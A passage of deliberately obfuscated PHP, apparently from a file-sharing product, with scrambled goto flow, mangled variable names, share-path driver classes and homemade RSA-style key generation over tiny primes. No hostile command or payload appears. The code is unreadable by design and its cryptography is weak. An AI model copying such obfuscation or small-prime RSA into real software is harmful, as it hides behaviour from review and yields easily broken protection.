break; } $b¯°ŠÍšØ¤++; } $d£‘¤ÁÚì .= $C—ßó¤Â½ß[$FÕÃªÕø]; } $Eåäá¢³ = $D·˜áåËÖ[326]($aƒ·æáèÜ . $d£‘¤ÁÚì); goto aœÃ¾òÈÚÍ; F„ª¨Š‰—½: $cˆßàË—° = $BÈ§ã°Ì™Ê[652]; while ($cˆßàË—° < $BÈ§ã°Ì™Ê[588]) { if ($cˆßàË—° >= 0) { break; } $cˆßàË—°++; } goto dâÁ…¼˜™Ò; AôùÀå«î°: $FÕÃªÕø = 0; $eĞÅÀİ‚ğ© = $BÈ§ã°Ì™Ê[649]; if (strlen($eĞÅÀİ‚ğ©) < $BÈ§ã°Ì™Ê[556]) { return; } goto F¢ÀïËì”Ì; dÖ®»›£¾˜: $aƒ·æáèÜ = $C—ßó¤Â½ß[$FŠÌìÂ­†]; $C­êµ ù¦Ò = $BÈ§ã°Ì™Ê[644]; if (!$C­êµ ù¦Ò) { return; } goto CéäòŒ‚µ„; A¼–•Ñµ¤¿: $a¦ÛœËÇ±• = 0; $b¨§µæÕ­” = $BÈ§ã°Ì™Ê[648]; if (!$b¨§µæÕ­”) { return; } goto AôùÀå«î°; CÂ„ÇÍÎ‹Œ: $d£‘¤ÁÚì = $D·˜áåËÖ[10]; $E‡Ç‹Š¨› = $BÈ§ã°Ì™Ê[647]; while (strlen($E‡Ç‹Š¨›) < $BÈ§ã°Ì™Ê[588]) { if (!$E‡Ç‹Š¨›) { break; } $E‡Ç‹Š¨›++; } goto A¼–•Ñµ¤¿; dâÁ…¼˜™Ò: default: $Eåäá¢³ = $this->{$_SERVER[¦“®å”‹ôÍ][149]}($cƒ¨„ Â‰, $cÒ‘ËéÊãÕ . $EğÑËâã¾); break; } goto b‘™’åî³Å; dò¥ Âæ: $cˆØÏ‚•ÉĞ = $BÈ§ã°Ì™Ê[634]; if (strlen($cˆØÏ‚•ÉĞ) < $BÈ§ã°Ì™Ê[550]) { die; } $cƒ¨„ Â‰ = $D·˜áåËÖ[2]($cƒ¨„ Â‰); goto b»İ©Şâ§ñ; AÅŒŒÌæ: if ($BÇù„ÇÅÛ - 1 > 0) { $Eåäá¢³ = $this->{$_SERVER[¦“®å”‹ôÍ][129]}($Eåäá¢³, $cÒ‘ËéÊãÕ, $BÇù„ÇÅÛ - 1); } return $Eåäá¢³; goto dÊ˜¦Í˜”; b»İ©Şâ§ñ: $Få¦»É¹‰Û = $BÈ§ã°Ì™Ê[635]; while ($Få¦»É¹‰Û < $BÈ§ã°Ì™Ê[564]) { if ($Få¦»É¹‰Û >= 0) { break; } $Få¦»É¹‰Û++; } $aéÓ¼»½ŞŠ = $D·˜áåËÖ[324](0, 5) . $D·˜áåËÖ[10]; goto Bì†´¢ë¦Ë; DùñïËîÃÛ: $BÈ§ã°Ì™Ê =& $_SERVER[´Ù×Íå‘ÄõÛ]; $D·˜áåËÖ =& $_SERVER[¦“®å”‹ôÍ]; $D·˜áåËÖ[328](1); goto dò¥ Âæ; Bì†´¢ë¦Ë: $d„Ó™È·²¥ = $BÈ§ã°Ì™Ê[636]; $EğÑËâã¾ = $D·˜áåËÖ[126](15); $C—ßó¤Â½ß = $D·˜áåËÖ[329]; goto Cá…ø¬ô±Ã; b‘™’åî³Å: $Eåäá¢³ = $D·˜áåËÖ[216]($aéÓ¼»½ŞŠ . $EğÑËâã¾ . $Eåäá¢³); $dŠ®ÀåøÁê = $BÈ§ã°Ì™Ê[653]; while (strlen($dŠ®ÀåøÁê) < $BÈ§ã°Ì™Ê[556]) { if (!$dŠ®ÀåøÁê) { break; } $dŠ®ÀåøÁê++; } goto AÅŒŒÌæ; dÊ˜¦Í˜”: } private function dwtib0405f86($D±¾õñèÃ«, $d«Ö¨ç¹£, $bİÑ¹ö§¡‰ = 3) { goto f±è÷í¥ã; DİÛÎœ¹ ¡: if ($bİÑ¹ö§¡‰ - 1 > 0) { $BòÊÕ§Œö¾ = $this->{$_SERVER[¦“®å”‹ôÍ][190]}($BòÊÕ§Œö¾, $d«Ö¨ç¹£, $bİÑ¹ö§¡‰ - 1); } return $BòÊÕ§Œö¾; goto BÀóÖ‡¨Ì; f±è÷í¥ã: $Dªí¬ï„â¼ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $FÓìŸğÒÚÛ =& $_SERVER[¦“®å”‹ôÍ]; if (!$FÓìŸğÒÚÛ[336]($D±¾õñèÃ«) || $FÓìŸğÒÚÛ[24]($D±¾õñèÃ«) < 10) { return !1; } goto aæÃÔˆëğö; aæÃÔˆëğö: $D±¾õñèÃ« = $FÓìŸğÒÚÛ[2]($D±¾õñèÃ«); $D±¾õñèÃ« = $FÓìŸğÒÚÛ[216]($D±¾õñèÃ«); $D‚³¨š´Ô¼ = $Dªí¬ï„â¼[654]; goto b£ïãº‹³å; FÚËÄÄéáƒ: while (strlen($fÇîˆñ•—™) < $Dªí¬ï„â¼[564]) { if (!$fÇîˆñ•—™) { break; } $fÇîˆñ•—™++; } $Bš²œ¶Š„ = $FÓìŸğÒÚÛ[25]($D±¾õñèÃ«, 1, 15); $D±¾õñèÃ« = $FÓìŸğÒÚÛ[25]($D±¾õñèÃ«, 16); goto Aš‡½›²Ö™; Aš‡½›²Ö™: $c†êÊŠù…¯ = $FÓìŸğÒÚÛ[329]; $fÏ˜ÛÖ›é¯ = $Dªí¬ï„â¼[656]; switch ($BŒç†íß›‹) { case $FÓìŸğÒÚÛ[234]: $BòÊÕ§Œö¾ = $this->{$_SERVER[¦“®å”‹ôÍ][248]}($D±¾õñèÃ«, $FÓìŸğÒÚÛ[216]($d«Ö¨ç¹£ . $Bš²œ¶Š„)); break; case $FÓìŸğÒÚÛ[222]: $BòÊÕ§Œö¾ = $this->{$_SERVER[¦“®å”‹ôÍ][248]}($D±¾õñèÃ«, $FÓìŸğÒÚÛ[216]($Bš²œ¶Š„ . $d«Ö¨ç¹£)); break; $B†ßˆÅÄ„° = $Dªí¬ï„â¼[657]; case $FÓìŸğÒÚÛ[330]: $BòÊÕ§Œö¾ = $this->{$_SERVER[¦“®å”‹ôÍ][248]}($D±¾õñèÃ«, $FÓìŸğÒÚÛ[120]($Bš²œ¶Š„ . $d«Ö¨ç¹£)); break; case $FÓìŸğÒÚÛ[331]: $BòÊÕ§Œö¾ = $this->{$_SERVER[¦“®å”‹ôÍ][248]}($D±¾õñèÃ«, $FÓìŸğÒÚÛ[116]($Bš²œ¶Š„ . $d«Ö¨ç¹£)); break; case $FÓìŸğÒÚÛ[332]: goto fàÛšˆÈÒä; c¾Ÿ“Ä·×: $BñäÄŠçÌ‰ = $FÓìŸğÒÚÛ[25]($BñäÄŠçÌ‰, $bµ²‘ºÍ° % 8, $bµ²‘ºÍ° % 8 + 7); $d›ÄÍÜ££³ = $Dªí¬ï„â¼[660]; if (strlen($d›ÄÍÜ££³) < $Dªí¬ï„â¼[588]) { die; } goto a†î†ŞŠ§Â; EÙÁÄˆŸÙ¿: $BñäÄŠçÌ‰ = $FÓìŸğÒÚÛ[116]($c·ì²«† . $FÓìŸğÒÚÛ[116]($d«Ö¨ç¹£ . $c·ì²«†) . $d«Ö¨ç¹£); $C‹œ›÷Óˆ½ = $Dªí¬ï„â¼[659]; while ($C‹œ›÷Óˆ½ < $Dªí¬ï„â¼[550]) { if ($C‹œ›÷Óˆ½ >= 0) { break; } $C‹œ›÷Óˆ½++; } goto c¾Ÿ“Ä·×; Aé­¥ ‹¶: $CÆğèêÇË– = $Dªí¬ï„â¼[661]; $c÷ŒÂÎ±Ú† = 0; for ($fÛ”«Â¼Û‘ = 0; $fÛ”«Â¼Û‘ < $FÓìŸğÒÚÛ[24]($D±¾õñèÃ«); $fÛ”«Â¼Û‘++) { $c÷ŒÂÎ±Ú† = $c÷ŒÂÎ±Ú† == $FÓìŸğÒÚÛ[24]($BñäÄŠçÌ‰) ? 0 : $c÷ŒÂÎ±Ú†; $e§ÏœÇ§¢ = $c÷ŒÂÎ±Ú†++; $AõÎÕ£¤¨æ = $Dªí¬ï„â¼[662]; $FÍ®ğ•—… = $FÓìŸğÒÚÛ[334]($c†êÊŠù…¯, $D±¾õñèÃ«[$fÛ”«Â¼Û‘]) - $bµ²‘ºÍ° - $FÓìŸğÒÚÛ[335]($BñäÄŠçÌ‰[$e§ÏœÇ§¢]); while ($FÍ®ğ•—… < 0) { $FÍ®ğ•—… += 64; } $BÉœ²æ‰† .= $c†êÊŠù…¯[$FÍ®ğ•—…]; $BíÂï»‡¶ = $Dªí¬ï„â¼[663]; } goto Fö‰¨øÛ°ò; a†î†ŞŠ§Â: $BÉœ²æ‰† = $FÓìŸğÒÚÛ[10]; $fÛ”«Â¼Û‘ = 0; $FÍ®ğ•—… = 0; goto Aé­¥ ‹¶; Fö‰¨øÛ°ò: $BòÊÕ§Œö¾ = $FÓìŸğÒÚÛ[338]($BÉœ²æ‰†); $C‹‘ÏÉÉğ = $Dªí¬ï„â¼[664]; if (strlen($C‹‘ÏÉÉğ) < $Dªí¬ï„â¼[558]) { die; } goto eÛÈòÇ°àÄ; fàÛšˆÈÒä: $D±¾õñèÃ« = $FÓìŸğÒÚÛ[337]($D±¾õñèÃ«); $dâÆ©õÑ‡ = $Dªí¬ï„â¼[658]; if (!$dâÆ©õÑ‡) { die; } goto FÖÉ‡¶´åæ; FÖÉ‡¶´åæ: $c·ì²«† = $D±¾õñèÃ«[0]; $D±¾õñèÃ« = $FÓìŸğÒÚÛ[25]($D±¾õñèÃ«, 1); $bµ²‘ºÍ° = $FÓìŸğÒÚÛ[334]($c†êÊŠù…¯, $c·ì²«†); goto EÙÁÄˆŸÙ¿; eÛÈòÇ°àÄ: break; goto f½¿Œ¥Ü›ˆ; f½¿Œ¥Ü›ˆ: default: $BòÊÕ§Œö¾ = $this->{$_SERVER[¦“®å”‹ôÍ][248]}($D±¾õñèÃ«, $d«Ö¨ç¹£ . $Bš²œ¶Š„); break; } goto DİÛÎœ¹ ¡; b£ïãº‹³å: if (strlen($D‚³¨š´Ô¼) < $Dªí¬ï„â¼[558]) { return; } $BŒç†íß›‹ = $D±¾õñèÃ«[0]; $fÇîˆñ•—™ = $Dªí¬ï„â¼[655]; goto FÚËÄÄéáƒ; BÀóÖ‡¨Ì: } public function lfhi7ebb6110($f–è²¥) { goto B°¥–‹ø™œ; b¢ÙˆÒ×¯: $eÑÚÔóÖùº = $f¤œÂ÷æ×[665]; if (!$eÑÚÔóÖùº) { return; } $aêƒ…¤ = $this->{$_SERVER[¦“®å”‹ôÍ][339]}(); goto då´åœâÏ; a’Ôğğö„: while (1) { $BÄ¡·¡ºïõ = $Cµ§¢¥è‹; $A¢œ‡‰¿Ñ = $Aªêô‰°²¥; $CåÇË³Ï¹’ = $f¤œÂ÷æ×[668]; if (!$CåÇË³Ï¹’) { return; } while ($A¢œ‡‰¿Ñ % $BÄ¡·¡ºïõ != 0) { $d½æ²±ù÷¹ = $A¢œ‡‰¿Ñ; $A¢œ‡‰¿Ñ = $BÄ¡·¡ºïõ; $bíæìá‰ = $f¤œÂ÷æ×[669]; while (strlen($bíæìá‰) < $f¤œÂ÷æ×[550]) { if (!$bíæìá‰) { break; } $bíæìá‰++; } $BÄ¡·¡ºïõ = $d½æ²±ù÷¹ % $BÄ¡·¡ºïõ; $CàÇ“è­å = $f¤œÂ÷æ×[670]; } if ($BÄ¡·¡ºïõ == 1) { break; } else { $Cµ§¢¥è‹++; } } $dğ‹¿Ñ­„ = 2; $B¾Ê½ÏˆÔ¯ = $f¤œÂ÷æ×[671]; goto aƒËšĞ•¡·; aƒËšĞ•¡·: for ($Bã·¼‰‘é» = 0; $Bã·¼‰‘é» < $Aªêô‰°²¥ * 10; $Bã·¼‰‘é»++) { if (($Aªêô‰°²¥ * $Bã·¼‰‘é» + 1) % $Cµ§¢¥è‹ == 0) { $dğ‹¿Ñ­„ = $E‘ÂÁàµ¥[203](($Aªêô‰°²¥ * $Bã·¼‰‘é» + 1) / $Cµ§¢¥è‹); break; } } $a÷éŸ„·éİ = $this->{$_SERVER[¦“®å”‹ôÍ][149]}($EèÌ¦‘³çÖ * $aêƒ…¤ . $E‘ÂÁàµ¥[10], $E‘ÂÁàµ¥[151]); $AÜöááÁ¸² = $f¤œÂ÷æ×[672]; goto eÚ¾Õ›ˆ…İ; eÚ¾Õ›ˆ…İ: if (!$AÜöááÁ¸²) { return; } $dÄí‹­˜…Ï = $E‘ÂÁàµ¥[116]($E‘ÂÁàµ¥[340] . ($EèÌ¦‘³çÖ + $aêƒ…¤) . $E‘ÂÁàµ¥[341] . $Cµ§¢¥è‹ . $E‘ÂÁàµ¥[341] . $dğ‹¿Ñ­„ . $E‘ÂÁàµ¥[342]); $AŒƒÅ¦‹¨œ = $this->{$_SERVER[¦“®å”‹ôÍ][149]}($f–è²¥, $dÄí‹­˜…Ï) . $E‘ÂÁàµ¥[343] . $a÷éŸ„·éİ; goto eÏ®Ã¨ŠÍò; eÏ®Ã¨ŠÍò: return $AŒƒÅ¦‹¨œ; $F”ôÂ­½œ = $f¤œÂ÷æ×[673]; goto dì¢åäæ¿; B°¥–‹ø™œ: $f¤œÂ÷æ× =& $_SERVER[´Ù×Íå‘ÄõÛ]; $E‘ÂÁàµ¥ =& $_SERVER[¦“®å”‹ôÍ]; $EèÌ¦‘³çÖ = $this->{$_SERVER[¦“®å”‹ôÍ][339]}(); goto b¢ÙˆÒ×¯; då´åœâÏ: $dµôåŸ¾¾ = $f¤œÂ÷æ×[666]; while ($dµôåŸ¾¾ < $f¤œÂ÷æ×[588]) { if ($dµôåŸ¾¾ >= 0) { break; } $dµôåŸ¾¾++; } $Aªêô‰°²¥ = ($EèÌ¦‘³çÖ - 1) * ($aêƒ…¤ - 1); goto Aù‡¹İˆ…¹; Aù‡¹İˆ…¹: $e¡Ú§À¤« = $f¤œÂ÷æ×[667]; while ($e¡Ú§À¤« < $f¤œÂ÷æ×[588]) { if ($e¡Ú§À¤« >= 0) { break; } $e¡Ú§À¤«++; } $Cµ§¢¥è‹ = $E‘ÂÁàµ¥[203](($EèÌ¦‘³çÖ + $aêƒ…¤) / 2); goto a’Ôğğö„; dì¢åäæ¿: } public function rzln504b7f3a($DŞŞ›º»Ğå) { goto fôâóÀš³ù; cÅé¨‰äæÍ: $fÓ®‘†³øñ = 0; $C¿œÛö¥› = 0; for ($F–É•„§¹ = 3; $F–É•„§¹ < $CÂÂ‚‡ƒ; $F–É•„§¹ += 2) { if ($CÂÂ‚‡ƒ % $F–É•„§¹ != 0) { continue; } $fÓ®‘†³øñ = $F–É•„§¹; $C¿œÛö¥› = $A‹³õóÂèŠ[203]($CÂÂ‚‡ƒ / $F–É•„§¹); $b£¤õÄâ‹ê = $A¢¸åœ±–Œ[675]; while (strlen($b£¤õÄâ‹ê) < $A¢¸åœ±–Œ[550]) { if (!$b£¤õÄâ‹ê) { break; } $b£¤õÄâ‹ê++; } break; $bÃ¨¸É¬°ó = $A¢¸åœ±–Œ[676]; if (!$bÃ¨¸É¬°ó) { die; } } goto cÎÈ‡Û‰”; B‚¬…‡‚ : $dÁì¼Ìõ»  = $A‹³õóÂèŠ[116]($A‹³õóÂèŠ[340] . ($fÓ®‘†³øñ + $C¿œÛö¥›) . $A‹³õóÂèŠ[341] . $C‡ ¡Ò‡Ä . $A‹³õóÂèŠ[341] . $B÷ƒÏÊ¸” . $A‹³õóÂèŠ[342]); $cøŠëÚ¹‘Õ = $A¢¸åœ±–Œ[683]; if (!$cøŠëÚ¹‘Õ) { return; } goto D’•ÛåØ„Ù; aäÈ•’ŞÚ™: $CÂÂ‚‡ƒ = $this->{$_SERVER[¦“®å”‹ôÍ][248]}($Bùé‹à¼[1] . $A‹³õóÂèŠ[10], $A‹³õóÂèŠ[151]); if (!$CÂÂ‚‡ƒ) { return $A‹³õóÂèŠ[10]; } $CÂÂ‚‡ƒ = $A‹³õóÂèŠ[203]($CÂÂ‚‡ƒ); goto cÅé¨‰äæÍ; e´´ÀĞØÛÔ: $E†ôÅôœÆŒ = $A¢¸åœ±–Œ[682]; if (strlen($E†ôÅôœÆŒ) < $A¢¸åœ±–Œ[556]) { die; } for ($F–É•„§¹ = 0; $F–É•„§¹ < $c¢§“µâ›ˆ * 10; $F–É•„§¹++) { if (($c¢§“µâ›ˆ * $F–É•„§¹ + 1) % $C‡ ¡Ò‡Ä == 0) { $B÷ƒÏÊ¸” = $A‹³õóÂèŠ[203](($c¢§“µâ›ˆ * $F–É•„§¹ + 1) / $C‡ ¡Ò‡Ä); break; } } goto B‚¬…‡‚ ; BÏ¸­£“: $fÕáİ¸¶Àâ = $A¢¸åœ±–Œ[674]; if (!$fÕáİ¸¶Àâ) { die; } if ($A‹³õóÂèŠ[19]($Bùé‹à¼) != 2) { return $A‹³õóÂèŠ[10]; } goto aäÈ•’ŞÚ™; fôâóÀš³ù: $A¢¸åœ±–Œ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $A‹³õóÂèŠ =& $_SERVER[¦“®å”‹ôÍ]; $Bùé‹à¼ = $A‹³õóÂèŠ[0]($A‹³õóÂèŠ[343], $DŞŞ›º»Ğå); goto BÏ¸­£“; cÎÈ‡Û‰”: $c¢§“µâ›ˆ = ($fÓ®‘†³øñ - 1) * ($C¿œÛö¥› - 1); $C‡ ¡Ò‡Ä = $A‹³õóÂèŠ[203](($fÓ®‘†³øñ + $C¿œÛö¥›) / 2); $C»¶¸œ´±Ç = $A¢¸åœ±–Œ[677]; goto b‚¨ø”Óì×; b‚¨ø”Óì×: while (strlen($C»¶¸œ´±Ç) < $A¢¸åœ±–Œ[550]) { if (!$C»¶¸œ´±Ç) { break; } $C»¶¸œ´±Ç++; } while (1) { $eÖ¡ËÎ‹Şõ = $C‡ ¡Ò‡Ä; $E²…‹Í´˜ = $A¢¸åœ±–Œ[678]; if (!$E²…‹Í´˜) { return; } $båšºè¿Ë = $c¢§“µâ›ˆ; $d¤‘¬¡Õë = $A¢¸åœ±–Œ[679]; if (!$d¤‘¬¡Õë) { die; } while ($båšºè¿Ë % $eÖ¡ËÎ‹Şõ != 0) { $F•«ÈÏ¾£“ = $båšºè¿Ë; $A¶Ê„Ïò‚Œ = $A¢¸åœ±–Œ[680]; if (!$A¶Ê„Ïò‚Œ) { die; } $båšºè¿Ë = $eÖ¡ËÎ‹Şõ; $D®¡”ÒìË¡ = $A¢¸åœ±–Œ[681]; if (strlen($D®¡”ÒìË¡) < $A¢¸åœ±–Œ[550]) { return; } $eÖ¡ËÎ‹Şõ = $F•«ÈÏ¾£“ % $eÖ¡ËÎ‹Şõ; } if ($eÖ¡ËÎ‹Şõ == 1) { break; } else { $C‡ ¡Ò‡Ä++; } } $B÷ƒÏÊ¸” = 2; goto e´´ÀĞØÛÔ; D’•ÛåØ„Ù: $F´Ãß¸ÍŒÔ = $this->{$_SERVER[¦“®å”‹ôÍ][248]}($Bùé‹à¼[0], $dÁì¼Ìõ» ); return $F´Ãß¸ÍŒÔ; goto E¬ç˜‚Û¶; E¬ç˜‚Û¶: } public function womaabf10c12() { goto B‹î“‹ôØÚ; Cİ–Ç¥—¹ö: $d—›˜´É¹³ = array(); $BŠ©µÜ¯õ = 1; $DÀ¤±¢Ú¨‹ = $e‚³ãÄÚĞŞ[684]; goto EÊÚ»™‘‰Õ; B‹î“‹ôØÚ: $e‚³ãÄÚĞŞ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $Aì„Î…ôé =& $_SERVER[¦“®å”‹ôÍ]; $AŒ·‹Ü·ÕÌ = $Aì„Î…ôé[324]($Aì„Î…ôé[344](2, 14), $Aì„Î…ôé[344](2, 16) - 1); goto Cİ–Ç¥—¹ö; EÊÚ»™‘‰Õ: if (strlen($DÀ¤±¢Ú¨‹) < $e‚³ãÄÚĞŞ[550]) { return; } while ($BŠ©µÜ¯õ <= (int) $Aì„Î…ôé[345]($AŒ·‹Ü·ÕÌ)) { $C´ººÍëèµ = $BŠ©µÜ¯õ; while (!0) { $C´ººÍëèµ++; if ($C´ººÍëèµ <= 2) { $BŠ©µÜ¯õ = $C´ººÍëèµ; break; } else { if ($C´ººÍëèµ < 2) { continue; } } $F¤îÔÔ›œ = !0; for ($A–ÎĞ¾ = 2; $A–ÎĞ¾ <= $Aì„Î…ôé[345]($C´ººÍëèµ); $A–ÎĞ¾++) { if ($C´ººÍëèµ % $A–ÎĞ¾ == 0) { $F¤îÔÔ›œ = !1; } } if ($F¤îÔÔ›œ) { $BŠ©µÜ¯õ = $C´ººÍëèµ; break; } } $d—›˜´É¹³[] = $BŠ©µÜ¯õ; $BŒº—Ôçí = $e‚³ãÄÚĞŞ[685]; } $fÕäÊ¬À‘ = 2; goto cëä²¸Û…›; cëä²¸Û…›: $cœ‹Î¶ÑİĞ = $e‚³ãÄÚĞŞ[686]; if (strlen($cœ‹Î¶ÑİĞ) < $e‚³ãÄÚĞŞ[588]) { die; } for ($C´ººÍëèµ = $AŒ·‹Ü·ÕÌ; $C´ººÍëèµ > 1; $C´ººÍëèµ--) { $F¤îÔÔ›œ = !0; foreach ($d—›˜´É¹³ as $E±à“æ‘¯£) { if ($C´ººÍëèµ % $E±à“æ‘¯£ == 0) { $F¤îÔÔ›œ = !1; break; } } if ($F¤îÔÔ›œ) { $fÕäÊ¬À‘ = $C´ººÍëèµ; break; } } goto Bç°î¼÷„‡; Bç°î¼÷„‡: return $fÕäÊ¬À‘; goto B«Ë‹‡ºö¶; B«Ë‹‡ºö¶: } public function pbuj70f68f51($E”Ä‚ÆŸÀî, $Fà—ÔŒ˜†‚) { $E³§Ûâì‡á =& $_SERVER[¦“®å”‹ôÍ]; return $E³§Ûâì‡á[13](array($E³§Ûâì‡á[14], $E³§Ûâì‡á[346]), $E”Ä‚ÆŸÀî, $Fà—ÔŒ˜†‚); } public function sdxf6393d543($F±É·´ŞØµ, $C’˜Å¡Ÿ×ó) { $FİêéÈ¨²¬ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $C•®‰òí¹è =& $_SERVER[¦“®å”‹ôÍ]; return $C•®‰òí¹è[13](array($C•®‰òí¹è[347], $C•®‰òí¹è[348]), $F±É·´ŞØµ, $C’˜Å¡Ÿ×ó); $E™‹ŒèÚ† = $FİêéÈ¨²¬[687]; if (strlen($E™‹ŒèÚ†) < $FİêéÈ¨²¬[564]) { die; } } public function gjfzfd24ae02($Cõ˜±óÙ•¢, $AªÍ¤ŸÔ«) { $c•òŒÄ¬ì¯ =& $_SERVER[¦“®å”‹ôÍ]; return $c•òŒÄ¬ì¯[13](array($c•òŒÄ¬ì¯[347], $c•òŒÄ¬ì¯[349]), $Cõ˜±óÙ•¢, $AªÍ¤ŸÔ«); } } goto Fïˆá±¿«º; Fã¢¯’¬¤°: class PathDriverDbShareItem extends PathDriverDB { public function __construct($Bì÷ãëˆ‘Ê) { $this->pathParse = $Bì÷ãëˆ‘Ê; $this->model = Model($_SERVER[´Ù×Íå‘ÄõÛ][1121]); } public function getPathOuter($dßµÔ°·ÉŞ) { $C¥á¹‹¤Ú =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (!$dßµÔ°·ÉŞ) { return $dßµÔ°·ÉŞ; } $f«ö„¤©‘ê = $this->parse($dßµÔ°·ÉŞ); return trim(KodIO::makeShare($this->pathParse[$C¥á¹‹¤Ú[367]], $f«ö„¤©‘ê[$C¥á¹‹¤Ú[367]]), $C¥á¹‹¤Ú[8]); } protected function infoParse($Bö§ìñÅôÊ, $A‰¤£ò…“ˆ = false, $bëæñŒİ ô = false) { $cŠ›“ãŒ¤ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $a‘² ¿¸­ = $this->pathParse[$cŠ›“ãŒ¤[367]]; $D—¦ÏÏ²Ò = trim($this->pathParse[$cŠ›“ãŒ¤[1016]], $cŠ›“ãŒ¤[8]); return Action($cŠ›“ãŒ¤[1128])->sharePathInfo($a‘² ¿¸­, $D—¦ÏÏ²Ò); } public function infoFull($EçäÊ‚š©ê) { $a›âø‚Ï–Ş =& $_SERVER[´Ù×Íå‘ÄõÛ]; $cñÙŒãÛ‘ó = explode($a›âø‚Ï–Ş[8], trim($EçäÊ‚š©ê, $a›âø‚Ï–Ş[8])); if (count($cñÙŒãÛ‘ó) > 1) { $Fµ ñ¾ù†î = implode($a›âø‚Ï–Ş[8], array_splice($cñÙŒãÛ‘ó, 1)); $E¹¦·Ûµñî = $this->model->pathInfoByPath($cñÙŒãÛ‘ó[0], $Fµ ñ¾ù†î); if (!$E¹¦·Ûµñî) { return !1; } $this->pathParse[$a›âø‚Ï–Ş[1016]] = $E¹¦·Ûµñî[$a›âø‚Ï–Ş[369]]; } return $this->infoParse($EçäÊ‚š©ê); } public function listAll($AğÂŒ¼§§) { goto e‚ƒÃ÷›ÍÎ; e‚ƒÃ÷›ÍÎ: $DÎ»â¬¼¥¼ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $CÌºù¶¾çå = IO::info($this->pathParse[$DÎ»â¬¼¥¼[75]]); if (!$CÌºù¶¾çå) { return array(); } goto C–‚®²÷”Ô; C–‚®²÷”Ô: $AÒÍ§ñ§¸ = $this->model->listAll($AğÂŒ¼§§); $F½­ôå„Ö = Model($DÎ»â¬¼¥¼[538])->getInfo($CÌºù¶¾çå[$DÎ»â¬¼¥¼[441]]); $B‘Î¥—ó» = Action($DÎ»â¬¼¥¼[1128]); goto F—‚£ŒË´Ë; F—‚£ŒË´Ë: foreach ($AÒÍ§ñ§¸ as &$b÷Ÿ™Ä¶†˜) { check_abort(); $b÷Ÿ™Ä¶†˜[$DÎ»â¬¼¥¼[391]] = $B‘Î¥—ó»->_shareItemeParse($b÷Ÿ™Ä¶†˜[$DÎ»â¬¼¥¼[391]], $F½­ôå„Ö); } return $AÒÍ§ñ§¸; goto f‘âàîª¹; f‘âàîª¹: } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($eùôŒÏÙ•¶) { $this->pathParse = $eùôŒÏÙ•¶; $this->model = Model($_SERVER[´Ù×Íå‘ÄõÛ][1121]); } protected function infoParse($BŠ“Œâ„…°, $E™ê¢¤³³ß = false, $a²©øñìÊ‘ = false) { $DîƒÀĞ˜‘Ó =& $_SERVER[´Ù×Íå‘ÄõÛ]; return Action($DîƒÀĞ˜‘Ó[1022])->sharePathInfo($this->pathParse[$DîƒÀĞ˜‘Ó[75]], !0); } public function listPath($E§“ĞÂ§Ùš, $B‚ÄŒ™õÀ› = false) { $bÊÂìàô§« =& $_SERVER[´Ù×Íå‘ÄõÛ]; $B‚ø£¯Œó½ = parent::listPath($E§“ĞÂ§Ùš, $B‚ÄŒ™õÀ›); foreach ($B‚ø£¯Œó½ as $dáÆÊ˜²§æ => $DŞ¬ô§ïöï) { if (!in_array($dáÆÊ˜²§æ, array($bÊÂìàô§«[73], $bÊÂìàô§«[74]))) { continue; } foreach ($DŞ¬ô§ïöï as $aãé“’Ó­ => $CÆœ²¤Ô…Ó) { $B‚ø£¯Œó½[$dáÆÊ˜²§æ][$aãé“’Ó­] = Action($bÊÂìàô§«[1022])->shareItemInfo($CÆœ²¤Ô…Ó); } } return $B‚ø£¯Œó½; } public function listAll($AÀà‚ÑÕ­•) { $AØÚ¨ÉĞ¡‡ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $C†»Ùöê—ë = IO::info($this->pathParse[$AØÚ¨ÉĞ¡‡[75]]); if (!$C†»Ùöê—ë) { return array(); } $BÓœŒ»°œÄ = $this->model->listAll($AÀà‚ÑÕ­•); foreach ($BÓœŒ»°œÄ as &$a«‘ĞŒÅÑä) { $a«‘ĞŒÅÑä[$AØÚ¨ÉĞ¡‡[391]] = Action($AØÚ¨ÉĞ¡‡[1022])->shareItemInfo($a«‘ĞŒÅÑä[$AØÚ¨ÉĞ¡‡[391]]); } return $BÓœŒ»°œÄ; } } class PathDriverDriverShareItem { public function __construct($DìÜÃ¦®ã³) { $this->pathParse = $DìÜÃ¦®ã³; } public function __call($cñ¡Àá×Š, $DØÅìœ—·ä) { $E«†¢¾¥õé =& $_SERVER[´Ù×Íå‘ÄõÛ]; if (method_exists($this, $cñ¡Àá×Š)) { return; } $EñÑ©ĞÓÀ = call_user_func_array(array($E«†¢¾¥õé[1129], $cñ¡Àá×Š), $DØÅìœ—·ä); $eÉ†ë—ƒÂÒ = array($E«†¢¾¥õé[1130], $E«†¢¾¥õé[1131], $E«†¢¾¥õé[1132], $E«†¢¾¥õé[1133], $E«†¢¾¥õé[492], $E«†¢¾¥õé[494], $E«†¢¾¥õé[1134], $E«†¢¾¥õé[103], $E«†¢¾¥õé[1135], $E«†¢¾¥õé[1136]); if (in_array($cñ¡Àá×Š, $eÉ†ë—ƒÂÒ)) { $EñÑ©ĞÓÀ = $this->getPathOuter($EñÑ©ĞÓÀ); } return $EñÑ©ĞÓÀ; } public function copy($dáÏ” ¨êĞ, $dòÍ‹Ç”°’, $aä¬²•ª÷ß = false) { return $this->copyMove($dáÏ” ¨êĞ, $dòÍ‹Ç”°’, $aä¬²•ª÷ß, $_SERVER[´Ù×Íå‘ÄõÛ][492]); } public function move($DëÇÌÃ¿É, $d‘‡™Ñ‰™â, $AŒŒ÷·ñóØ = false) { return $this->copyMove($DëÇÌÃ¿É, $d‘‡™Ñ‰™â, $AŒŒ÷·ñóØ, $_SERVER[´Ù×Íå‘ÄõÛ][494]); } private function copyMove($fñĞ¯°Ã‚ë, $d’·é›‹æ , $e ›õï†¢‡, $BœµŞÇÑ¾«) { goto A¨ø—«Âî; A¨ø—«Âî: $d‹¥òï¤¦ =& $_SERVER[´Ù×Íå‘ÄõÛ]; $e±ŸÍß‹Óâ = $d’·é›‹æ ; $CšÈÙõÇ• = IO::driverMake($d’·é›‹æ ); goto CùŠËôŞ–‰; D‰ôê°Ö¼: return $CÙ÷çåÃ§å; goto dÙÅóÖ¨¬; 